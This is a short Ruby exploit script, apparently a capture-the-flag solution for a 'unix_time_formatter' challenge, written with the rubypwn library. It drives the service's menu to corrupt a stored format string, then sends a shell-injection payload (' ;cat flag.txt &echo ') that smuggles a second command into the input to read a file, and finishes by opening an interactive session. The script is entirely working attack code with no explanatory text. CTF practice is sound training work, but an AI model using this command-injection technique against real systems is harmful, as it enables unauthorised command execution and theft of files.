#!/usr/bin/env ruby
#
#
require 'rubypwn'
class Exec
	def set_format fmt
		puts "1"
		read_until ": "
		puts fmt
		read_until "> "
	end
end
nc = Exec.new("nc  unix.pwning.xxx 9999")
#nc = Exec.new("./unix_time_formatter_9a0c42cadcb931cce0f9b7a1b4037c6b")

nc.read_until "> "
nc.set_format "A"*100
nc.puts "5"
nc.read_until "?"
nc.puts "N"
nc.puts "3"
nc.read_until ": "
nc.puts "' ;cat flag.txt &echo '".ljust(100,"A")
nc.puts "4"
nc.interactive


